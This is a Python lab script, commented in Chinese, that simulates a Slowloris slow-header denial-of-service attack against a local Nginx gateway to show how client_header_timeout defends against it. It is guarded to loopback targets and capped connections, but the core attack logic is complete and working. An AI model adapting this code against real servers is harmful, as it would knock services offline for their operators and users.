"""Local-only Slowloris simulator for the Nginx gateway lab.

Slowloris keeps HTTP request headers unfinished. This implementation is guarded
so it can only target loopback addresses in a local, authorized lab.

展示说明：
- 这个脚本模拟 Slowloris（慢速 HTTP 请求头攻击）。
- 它连接 Nginx 网关 127.0.0.1:8080，而不是直接连接后端 127.0.0.1:18080。
- 它会先发送一部分 HTTP 请求头，然后故意不发送结束空行 \r\n\r\n。
- Nginx 会认为“客户端还没发完请求头”，于是持续占用连接等待。
- 加固配置中的 client_header_timeout 5s 就是针对这种“请求头迟迟不结束”的场景。
"""

from __future__ import annotations

import argparse
import random
import socket
import string
import sys
import time
from dataclasses import dataclass


# 安全边界：攻击模拟工具只允许打本机回环地址，避免误伤公网、第三方系统或生产环境。
ALLOWED_HOSTS = {"127.0.0.1", "localhost", "::1"}

# 本地实验的连接数上限。即使误传很大的 --connections，也不会无限制创建连接。
MAX_CONNECTIONS = 200


@dataclass
class SlowConnection:
    """记录一个慢连接。

    sock 是底层 TCP（Transmission Control Protocol，传输控制协议）socket。
    index 用来标识第几个连接，连接失败时方便打印提示。
    """

    sock: socket.socket
    index: int


def is_allowed_local_host(host: str) -> bool:
    """检查目标是否在允许的本地地址范围内。"""

    return host.lower() in ALLOWED_HOSTS


def make_socket(host: str, port: int, timeout: float) -> socket.socket:
    """创建并连接一个 TCP socket。

    展示时可以理解为：这里建立的是“客户端到 Nginx 网关”的一条连接。
    Slowloris 的效果不是靠单个连接，而是靠很多这样的连接长期不结束。
    """

    family = socket.AF_INET6 if host == "::1" else socket.AF_INET
    sock = socket.socket(family, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))
    return sock


def random_token(length: int = 8) -> str:
    """生成随机字符串，用来构造看起来不同的请求头字段。"""

    alphabet = string.ascii_letters + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def send_initial_header(sock: socket.socket, host: str, path: str) -> None:
    """发送第一段 HTTP 请求头，但故意不发送结束空行。

    正常 HTTP 请求头最后应该以空行结束，也就是 \r\n\r\n。
    这里的 request 只以普通请求头行结尾，没有发送最后的空行。
    这就是 Slowloris 的关键：让 Nginx 觉得请求头还没发完。
    """

    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: local-slowloris-lab/1.0\r\n"
        "Accept: */*\r\n"
        "Connection: keep-alive\r\n"
    )
    sock.sendall(request.encode("ascii"))


def send_keepalive_header(sock: socket.socket) -> None:
    """隔一段时间补发一行请求头，让连接继续保持“未完成”。

    这里发送的是类似 `X-Lab-abc123: randomValue` 的自定义头。
    它仍然不是结束空行，所以 Nginx 还会继续等待。
    基线配置下，这些连接会更久地保持 alive。
    加固配置下，client_header_timeout 5s 会更快把它们清理掉。
    """

    header = f"X-Lab-{random_token(6)}: {random_token(12)}\r\n"
    sock.sendall(header.encode("ascii"))


def open_connection(index: int, host: str, port: int, path: str, timeout: float) -> SlowConnection | None:
    """打开一个慢连接，并发送第一段未完成请求头。"""

    try:
        sock = make_socket(host, port, timeout)
        send_initial_header(sock, host, path)
        return SlowConnection(sock=sock, index=index)
    except OSError as exc:
        print(f"[warn] connection {index} failed: {exc}", flush=True)
        return None


def close_all(connections: list[SlowConnection]) -> None:
    """测试结束后关闭所有本地慢连接，避免残留占用端口。"""

    for conn in connections:
        try:
            conn.sock.close()
        except OSError:
            pass


def parse_args() -> argparse.Namespace:
    """解析攻击模拟参数。

    展示时重点记住默认演示参数：
    - host/port：默认打 127.0.0.1:8080，也就是 Nginx 网关。
    - connections：慢连接数量。
    - interval：每隔多少秒补发一小段请求头。
    - duration：本轮模拟持续多久。
    """

    parser = argparse.ArgumentParser(
        description="Run a local-only Slowloris simulation against Nginx."
    )
    parser.add_argument("--host", default="127.0.0.1", help="target host; loopback only")
    parser.add_argument("--port", default=8080, type=int, help="target port")
    parser.add_argument("--path", default="/", help="request path")
    parser.add_argument("--connections", default=30, type=int, help="slow connection count")
    parser.add_argument("--interval", default=10.0, type=float, help="seconds between header drips")
    parser.add_argument("--duration", default=60.0, type=float, help="total run time in seconds")
    parser.add_argument("--connect-timeout", default=5.0, type=float, help="socket connect timeout")
    return parser.parse_args()


def validate_args(args: argparse.Namespace) -> None:
    """检查参数是否安全、合理。"""

    if not is_allowed_local_host(args.host):
        raise SystemExit(
            "Refusing to run: this lab tool only allows localhost, 127.0.0.1, or ::1."
        )
    if args.connections < 1:
        raise SystemExit("--connections must be at least 1.")
    if args.connections > MAX_CONNECTIONS:
        raise SystemExit(
            f"--connections is capped at {MAX_CONNECTIONS} for local safety."
        )
    if args.interval <= 0:
        raise SystemExit("--interval must be greater than 0.")
    if args.duration <= 0:
        raise SystemExit("--duration must be greater than 0.")
    if not args.path.startswith("/"):
        raise SystemExit("--path must start with '/'.")


def main() -> int:
    """执行 Slowloris 模拟。

    输出中的 alive 是展示时最关键的指标：
    - 基线组持续 alive=60，说明慢连接长期存活。
    - 加固组第二轮 alive=0，说明 Nginx 主动清理了慢连接。
    """

    args = parse_args()
    validate_args(args)

    print("Local authorized lab only. Do not use this tool against external targets.", flush=True)
    print(
        f"Target: {args.host}:{args.port}, connections={args.connections}, "
        f"interval={args.interval}s, duration={args.duration}s",
        flush=True,
    )

    # 第一阶段：批量建立慢连接，并只发送“未完成的请求头”。
    connections: list[SlowConnection] = []
    for index in range(args.connections):
        conn = open_connection(index, args.host, args.port, args.path, args.connect_timeout)
        if conn is not None:
            connections.append(conn)

    print(f"Opened {len(connections)} slow connections.", flush=True)
    if not connections:
        print("No connections opened. Is Nginx listening on the target port?", flush=True)
        return 2

    # 第二阶段：每隔 interval 秒补发一行请求头，但始终不发结束空行。
    # alive 越高，说明仍有越多慢连接占用着 Nginx 入口。
    start = time.monotonic()
    round_no = 0
    try:
        while time.monotonic() - start < args.duration:
            round_no += 1
            alive: list[SlowConnection] = []
            failed = 0
            for conn in connections:
                try:
                    send_keepalive_header(conn.sock)
                    alive.append(conn)
                except OSError:
                    failed += 1

            connections = alive
            print(
                f"[round {round_no}] alive={len(connections)} failed_since_last_round={failed}",
                flush=True,
            )
            if not connections:
                print("All slow connections were closed by the server.", flush=True)
                break
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\nInterrupted by user.", flush=True)
    finally:
        close_all(connections)
        print("Closed local slow connections.", flush=True)

    return 0


if __name__ == "__main__":
    sys.exit(main())
